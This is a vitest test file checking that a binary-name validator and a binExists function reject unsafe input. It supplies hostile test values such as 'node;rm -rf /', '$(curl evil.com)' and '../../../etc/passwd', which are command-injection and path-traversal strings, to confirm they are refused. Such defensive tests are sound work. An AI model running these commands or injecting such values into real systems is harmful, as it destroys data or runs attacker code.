import { describe, test, expect } from 'vitest';
import { binExists, BIN_NAME_REGEX } from '../../src/utils/bin-exists.js';

describe('bin-exists', () => {
  // ── Regex validation ────────────────────────────────

  describe('BIN_NAME_REGEX', () => {
    test('accepts simple binary names', () => {
      expect(BIN_NAME_REGEX.test('node')).toBe(true);
      expect(BIN_NAME_REGEX.test('python3')).toBe(true);
      expect(BIN_NAME_REGEX.test('my-tool')).toBe(true);
      expect(BIN_NAME_REGEX.test('my_tool')).toBe(true);
      expect(BIN_NAME_REGEX.test('tool.exe')).toBe(true);
    });

    test('rejects paths with slashes', () => {
      expect(BIN_NAME_REGEX.test('/usr/bin/node')).toBe(false);
      expect(BIN_NAME_REGEX.test('./node_modules/.bin/prettier')).toBe(false);
      expect(BIN_NAME_REGEX.test('..\\evil')).toBe(false);
    });

    test('rejects shell metacharacters', () => {
      expect(BIN_NAME_REGEX.test('foo;bar')).toBe(false);
      expect(BIN_NAME_REGEX.test('foo|bar')).toBe(false);
      expect(BIN_NAME_REGEX.test('foo&bar')).toBe(false);
      expect(BIN_NAME_REGEX.test('$(evil)')).toBe(false);
      expect(BIN_NAME_REGEX.test('`evil`')).toBe(false);
      expect(BIN_NAME_REGEX.test('foo bar')).toBe(false);
    });

    test('rejects empty string', () => {
      expect(BIN_NAME_REGEX.test('')).toBe(false);
    });
  });

  // ── binExists function ──────────────────────────────

  describe('binExists()', () => {
    test('returns true for node (always available in test env)', async () => {
      expect(await binExists('node')).toBe(true);
    });

    test('returns false for nonexistent binary', async () => {
      expect(await binExists('definitely-not-a-real-binary-xyzzy')).toBe(false);
    });

    test('returns false for path traversal attempt', async () => {
      expect(await binExists('../../../etc/passwd')).toBe(false);
    });

    test('returns false for shell injection attempt', async () => {
      expect(await binExists('node;rm -rf /')).toBe(false);
    });

    test('returns false for empty string', async () => {
      expect(await binExists('')).toBe(false);
    });

    test('returns false for command substitution attempt', async () => {
      expect(await binExists('$(curl evil.com)')).toBe(false);
    });
  });
});
